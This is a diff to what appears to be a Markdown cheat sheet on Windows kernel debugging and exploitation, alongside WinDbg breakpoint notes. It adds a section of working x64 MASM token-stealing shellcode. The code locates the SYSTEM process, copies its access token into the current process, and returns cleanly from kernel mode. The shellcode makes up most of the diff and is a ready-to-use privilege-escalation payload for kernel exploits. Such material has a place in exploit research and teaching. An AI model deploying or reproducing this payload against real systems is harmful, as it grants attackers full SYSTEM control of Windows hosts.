@@ -14,10 +14,11 @@
 	- [SMAP During Debugging](#smap-during-debugging)
 	- [Mona in WinDbg](#mona-in-windbg)
 	- [Conditional Breakpoints](#conditional-breakpoints)
+ - [Token Stealing Shellcode](#token-stealing-shellcode)
 
 ---
 
-# Run Powershell Elevated
+## Run Powershell Elevated
 - Sometime is might be needed to start an elevated powershell from commandline
 
 ```powershell
@@ -211,5 +212,40 @@ bp ntdll+31337 ".printf \"alloc(0x%x) = 0x%p from 0x%p \\n\", poi(rsp+50), rax, 
 ba e1 /p <process> example+1337 ".if ( qwo(@rcx+0x18) != 0x300 ) { dqs @rcx+0x18 L1; } .else { gc; }
 ```
 
+## Token Stealing Shellcode
+- Simple token stealing shellcode (`masm` compatible)
+```asm
+_TEXT	SEGMENT
+    shellcode PROC
+        mov rax, QWORD PTR gs:[0188h]
+        mov rax, QWORD PTR [rax + 0b8h]
+        mov rbx, rax
+        __LOOP:
+            mov rbx, QWORD PTR [rbx + 0448h]
+            sub rbx, 0448h
+            mov rcx, QWORD PTR [rbx + 0440h]
+            cmp rcx, 04h
+            jnz __LOOP
+        __ADJUST:
+            mov rcx, QWORD PTR [rbx + 04b8h]
+            and cl, 0f0h
+            mov QWORD PTR [rax + 04b8h], rcx
+        __CLEANUP:
+            mov rax, QWORD PTR gs:[0188h]
+            mov cx, WORD PTR [rax + 01e4h]
+            inc cx
+            mov WORD PTR [rax + 01e4h], cx
+            mov rdx, QWORD PTR [rax + 090h]
+            mov rcx, QWORD PTR [rdx + 0168h]
+            mov r11, QWORD PTR [rdx + 0178h]
+            mov rsp, QWORD PTR [rdx + 0180h]
+            mov rbp, QWORD PTR [rdx + 0158h]
+            xor eax, eax
+            swapgs
+            sysretq
+    shellcode ENDP
+_TEXT	ENDS
+END
+```
 
 
